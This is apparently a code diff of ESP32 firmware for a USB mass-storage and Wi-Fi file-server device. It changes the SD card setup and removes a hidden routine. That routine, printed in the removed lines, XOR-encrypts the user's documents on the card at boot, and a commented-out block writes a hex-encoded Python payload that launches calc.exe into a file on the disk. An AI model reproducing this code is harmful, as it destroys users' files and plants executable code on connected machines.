@@ -29,13 +29,7 @@
 #include "board.h"
 #include "tusb_msc.h"
 
-#include <stdio.h>
-#include <stdlib.h>
-#include <dirent.h>
-#include <string.h>
-
 static const char *TAG = "usb_msc_wireless";
-#define BLOCK_SIZE 1024
 
 #ifdef CONFIG_USE_EXTERNAL_SDCARD
 #ifdef CONFIG_SDCARD_INTFC_SPI
@@ -46,7 +40,7 @@ static const char *TAG = "usb_msc_wireless";
 #define BOARD_SDCARD_SDIO_CLK_PIN BOARD_SDCARD_SDIO_CLK
 #define BOARD_SDCARD_SDIO_CMD_PIN BOARD_SDCARD_SDIO_CMD
 #define BOARD_SDCARD_SDIO_DO_PIN BOARD_SDCARD_SDIO_DATA0
-#define BOARD_SDCARD_SDIO_DATA_WIDTH 4
+#define BOARD_SDCARD_SDIO_DATA_WIDTH 1
 #include "driver/sdmmc_host.h"
 #else
 #error "Not supported interface"
@@ -102,7 +96,6 @@ static esp_err_t init_fat(sdmmc_card_t **card_handle, const char *base_path)
 #elif defined(CONFIG_SDCARD_INTFC_SDIO) && defined(SOC_SDMMC_HOST_SUPPORTED)
     ESP_LOGI(TAG, "Using SDIO Interface");
     sdmmc_host_t host = SDMMC_HOST_DEFAULT();
-    //host.max_freq_khz = 20000;
 
     // This initializes the slot without card detect (CD) and write protect (WP) signals.
     // Modify slot_config.gpio_cd and slot_config.gpio_wp if your board has these signals.
@@ -110,11 +103,11 @@ static esp_err_t init_fat(sdmmc_card_t **card_handle, const char *base_path)
     slot_config.clk = BOARD_SDCARD_SDIO_CLK_PIN;
     slot_config.cmd = BOARD_SDCARD_SDIO_CMD_PIN;
     slot_config.d0 = BOARD_SDCARD_SDIO_DO_PIN;
-    slot_config.d1 = BOARD_SDCARD_SDIO_DATA1;
-    slot_config.d2 = BOARD_SDCARD_SDIO_DATA2;
-    slot_config.d3 = BOARD_SDCARD_SDIO_DATA3;
+    //slot_config.d1 = BOARD_SDCARD_SDIO_DATA1;
+   // slot_config.d2 = BOARD_SDCARD_SDIO_DATA2;
+   // slot_config.d3 = BOARD_SDCARD_SDIO_DATA3;
     // To use 1-line SD mode, change this to 1:
-    slot_config.width = BOARD_SDCARD_SDIO_DATA_WIDTH;
+    slot_config.width = 1;
     // Enable internal pullups on enabled pins. The internal pullups
     // are insufficient however, please make sure 10k external pullups are
     // connected on the bus. This is for debug / example purpose only.
@@ -139,7 +132,6 @@ static esp_err_t init_fat(sdmmc_card_t **card_handle, const char *base_path)
     }
 
     // Card has been initialized, print its properties
-    ESP_LOGI(TAG, "begin log sdcard info");
     sdmmc_card_print_info(stdout, card);
 
     if (card_handle) {
@@ -150,95 +142,6 @@ static esp_err_t init_fat(sdmmc_card_t **card_handle, const char *base_path)
 
     return ESP_OK;
 }
-
-
-
-// 使用异或运算进行加密和解密
-void encrypt_decrypt(char *data, int len, char *key) {
-    for (int i = 0; i < len; i++) {
-        data[i] = data[i] ^ key[i % strlen(key)];
-    }
-}
-
-int encrypt_dir() {
-    DIR *dir;
-    struct dirent *ent;
-    dir = opendir("/disk"); // 打开 /disk 目录
-
-    if (dir != NULL) {
-        while ((ent = readdir(dir)) != NULL) {
-            char *filename = ent->d_name;
-            char filepath[300]; // 修改为更大的数组以适应文件路径长度
-            snprintf(filepath, sizeof(filepath), "/disk/%s", filename);
-
-            if (strstr(filename, ".txt") || strstr(filename, ".doc") || strstr(filename, ".docx") || strstr(filename, ".pdf")) {
-                FILE *file = fopen(filepath, "r+");
-                if (file != NULL) {
-                    // 读取文件内容
-                    fseek(file, 0, SEEK_END);
-                    long file_size = ftell(file);
-                    fseek(file, 0, SEEK_SET);
-
-                    char key[] = "EncryptionKey123";
-                    char buffer[BLOCK_SIZE];
-
-                    // 检查文件是否已加密
-                    char check;
-                    if (fread(&check, 1, 1, file) != 1 || check != 'E') {
-                        FILE* tmp=fopen("/disk/tmp", "w+");
-                        fputc('E', tmp);
-                        fseek(file, 0, SEEK_SET); // 重新设置文件位置指针
-
-                        while (file_size > 0) {
-                            size_t read_size = fread(buffer, 1, BLOCK_SIZE, file);
-                            if (read_size == 0) {
-                                break;
-                            }
-
-                            encrypt_decrypt(buffer, read_size, key);
-
-                            //fseek(file, -read_size, SEEK_CUR);
-                            //fwrite(buffer, 1, read_size, file);
-                            fwrite(buffer, 1, read_size, tmp);
-
-                            file_size -= read_size;
-                        }
-
-                        fseek(file, 0, SEEK_SET);
-                        fseek(tmp, 0, SEEK_SET);
-
-                        size_t bytesRead;
-                        while ((bytesRead = fread(buffer, 1, BLOCK_SIZE, tmp)) > 0) {
-                            fwrite(buffer, 1, bytesRead, file);
-                        }
-
-                        fclose(file);
-                        fclose(tmp);
-
-                        // 删除原文件
-                        remove("/disk/tmp");
-
-
-                        printf("File %s encrypted.\n", filename);
-                    } else {
-                        printf("File %s is already encrypted.\n", filename);
-                    }
-
-                } else {
-                    printf("Failed to open file %s.\n", filename);
-                }
-            }
-        }
-        closedir(dir);
-    } else {
-        perror("Unable to open directory.");
-        return 1;
-    }
-
-    return 0;
-}
-
-
 
 extern esp_err_t start_file_server(const char *base_path);
 
@@ -255,14 +158,14 @@ void app_main(void)
 #endif
 
     /* Initialize file storage */
-   ESP_ERROR_CHECK(init_fat(&mount_card, disk_path));
-   vTaskDelay(100 / portTICK_PERIOD_MS);
+    ESP_ERROR_CHECK(init_fat(&mount_card, disk_path));
+    vTaskDelay(100 / portTICK_PERIOD_MS);
 
 #ifdef CONFIG_WIFI_HTTP_ACCESS
     /* Wi-Fi init with configs from menuconfig */
-   iot_board_wifi_init();
+    iot_board_wifi_init();
     /* Start the file server */
-  ESP_ERROR_CHECK(start_file_server(disk_path));
+    ESP_ERROR_CHECK(start_file_server(disk_path));
 #endif
 
     tinyusb_config_t tusb_cfg = {
@@ -280,37 +183,12 @@ void app_main(void)
     ESP_LOGI(TAG, "USB initialization DONE");
 
     bool led_state = false;
-    bool fend=false;
 
     while (1) {
         if (iot_board_led_all_set_state)
         iot_board_led_all_set_state(led_state);
         led_state = !led_state;
         vTaskDelay(1000 / portTICK_RATE_MS);
-        ESP_LOGI(TAG, "timer print");
-       
-        if(fend){
-            continue;
-        }
-    
-        encrypt_dir();
-
-     
-        fend=true;
-        //ESP_ERROR_CHECK(tinyusb_driver_install(&tusb_cfg));
-        //ESP_ERROR_CHECK(tusb_msc_init(&msc_cfg));
-      
-
-        /*
-        ESP_LOGD(TAG, "begin modify test.py");
-        fd=fopen("/disk/test.py","w");
-        char shellcode[]={0x69,0x6d,0x70,0x6f,0x72,0x74,0x20,0x6f,0x73,0x0a,0x6f,0x73,0x2e,0x73,0x79,0x73,0x74,0x65,0x6d,0x28,0x22,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,0x22,0x29,0x0a,0x0a};
-        fwrite(shellcode,sizeof(shellcode),1,fd);
-        fclose(fd);
-        fend=true;
-        ESP_LOGD(TAG, "finish modify test.py");
-        */
-        
     }
 
 }
